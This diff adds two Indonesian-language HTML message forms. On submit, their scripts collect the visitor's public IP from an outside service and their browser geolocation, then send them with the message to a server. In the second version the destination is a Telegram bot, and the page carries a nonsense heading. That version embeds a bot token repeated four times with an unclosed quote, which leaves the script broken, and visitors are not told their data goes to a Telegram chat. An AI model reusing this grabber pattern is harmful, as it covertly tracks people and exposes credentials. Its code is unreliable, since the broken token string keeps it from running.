@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Form Pengiriman Pesan dengan Lokasi dan IP</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 20px;
+    }
+    form {
+      margin-top: 20px;
+    }
+    input[type="text"], textarea {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+    }
+    button {
+      padding: 10px 20px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Form Pengiriman Pesan</h1>
+
+  <form id="messageForm">
+    <label for="message">Pesan Anda:</label>
+    <textarea id="message" name="message" rows="4" required></textarea><br>
+    
+    <button type="submit">Kirim Pesan</button>
+  </form>
+
+  <div id="info"></div>
+
+  <script>
+    // Fungsi untuk mendapatkan lokasi dan IP
+    function getLocationAndSendMessage(event) {
+      event.preventDefault();
+
+      // Dapatkan IP menggunakan API IP public service
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          console.log("IP Address:", ip);
+          document.getElementById("info").innerHTML = `IP Address Anda: ${ip}<br>`;
+
+          // Dapatkan lokasi pengguna
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+              console.log("Lokasi:", lat, lon);
+
+              // Menampilkan lokasi di halaman
+              document.getElementById("info").innerHTML += `Lokasi Anda: Latitude ${lat}, Longitude ${lon}<br>`;
+
+              // Kirim data pesan bersama lokasi dan IP
+              const message = document.getElementById("message").value;
+
+              const data = {
+                message: message,
+                ip: ip,
+                location: { lat: lat, lon: lon }
+              };
+
+              // Kirim data ke server (misal dengan fetch ke server)
+              fetch('https://example.com/send-message', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+              })
+              .then(response => response.json())
+              .then(responseData => {
+                alert('Pesan berhasil dikirim!');
+                console.log(responseData);
+              })
+              .catch(error => {
+                console.error('Terjadi kesalahan:', error);
+              });
+            }, function(error) {
+              alert('Gagal mendapatkan lokasi: ' + error.message);
+            });
+          } else {
+            alert("Geolocation tidak didukung oleh browser ini.");
+          }
+        })
+        .catch(error => {
+          console.error('Gagal mendapatkan IP:', error);
+        });
+    }
+
+    // Event listener form submit
+    document.getElementById("messageForm").addEventListener("submit", getLocationAndSendMessage);
+  </script>
+
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Form Pengiriman Pesan dengan Lokasi dan IP ke Telegram</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 20px;
+    }
+    form {
+      margin-top: 20px;
+    }
+    input[type="text"], textarea {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+    }
+    button {
+      padding: 10px 20px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>mi goreng mi kuah mwh mwh </h1>
+
+  <form id="messageForm">
+    <label for="message">Pesan Anda:</label>
+    <textarea id="message" name="message" rows="4" required></textarea><br>
+    
+    <button type="submit">Kirim Pesan</button>
+  </form>
+
+  <div id="info"></div>
+
+  <script>
+    // Fungsi untuk mendapatkan lokasi dan IP serta mengirim pesan ke Telegram
+    function getLocationAndSendMessage(event) {
+      event.preventDefault();
+
+      // Dapatkan IP menggunakan API IP public service
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          console.log("IP Address:", ip);
+          document.getElementById("info").innerHTML = `IP Address Anda: ${ip}<br>`;
+
+          // Dapatkan lokasi pengguna
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+              console.log("Lokasi:", lat, lon);
+
+              // Menampilkan lokasi di halaman
+              document.getElementById("info").innerHTML += `Lokasi Anda: Latitude ${lat}, Longitude ${lon}<br>`;
+
+              // Ambil pesan dari form
+              const message = document.getElementById("message").value;
+
+              // Format pesan untuk dikirim ke Telegram
+              const telegramMessage = `
+                Pesan dari Pengguna:
+                Message: ${message}
+                IP: ${ip}
+                Lokasi: Latitude ${lat}, Longitude ${lon}
+              `;
+
+              // Kirim pesan ke Telegram
+              const botToken = '7752420202:AAHRZhx-pD2QKgJ7ml3Ac31XANmx69Ar7_A7752420202:AAHRZhx-pD2QKgJ7ml3Ac31XANmx69Ar7_A7752420202:AAHRZhx-pD2QKgJ7ml3Ac31XANmx69Ar7_A7752420202:AAHRZhx-pD2QKgJ7ml3Ac31XANmx69Ar7_A;  // Ganti dengan API Token bot Anda
+              const chatId = 'YOUR_CHAT_ID';  // Ganti dengan Chat ID (untuk grup atau pengguna)
+
+              const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+              const params = {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  text: telegramMessage
+                })
+              };
+
+              fetch(telegramUrl, params)
+                .then(response => response.json())
+                .then(responseData => {
+                  alert('Pesan berhasil dikirim ke Telegram!');
+                  console.log(responseData);
+                })
+                .catch(error => {
+                  console.error('Terjadi kesalahan:', error);
+                });
+            }, function(error) {
+              alert('Gagal mendapatkan lokasi: ' + error.message);
+            });
+          } else {
+            alert("Geolocation tidak didukung oleh browser ini.");
+          }
+        })
+        .catch(error => {
+          console.error('Gagal mendapatkan IP:', error);
+        });
+    }
+
+    // Event listener form submit
+    document.getElementById("messageForm").addEventListener("submit", getLocationAndSendMessage);
+  </script>
+
+</body>
+</html>
